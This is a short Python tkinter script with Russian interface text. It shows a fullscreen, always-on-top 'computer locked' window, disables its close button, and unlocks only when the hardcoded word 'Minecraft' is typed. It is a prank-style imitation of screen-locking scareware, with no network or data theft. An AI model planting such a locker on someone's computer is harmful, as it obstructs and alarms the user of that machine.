import tkinter as tk

def unlock():
    if entry.get() == 'Minecraft':
        root.destroy()
    else:
        label.config(text="Неверный пароль!")

root = tk.Tk()
root.title("Заблокирован компьтер")
root.attributes('-topmost', True)
root.attributes('-fullscreen', True)

label = tk.Label(root, text="Введите секретное слово:", font=('Arial', 20))
label.pack(pady=50)

entry = tk.Entry(root, show='*', font=('Arial', 20))
entry.pack(pady=20)

button = tk.Button(root, text="Разблокировать", command=unlock, font=('Arial', 20))
button.pack(pady=20)

# Запрещаем закрытие окна через крестик
root.protocol("WM_DELETE_WINDOW", lambda: None)

root.mainloop()
root.protocol("WM_DELETE_WINDOW", lambda: None)
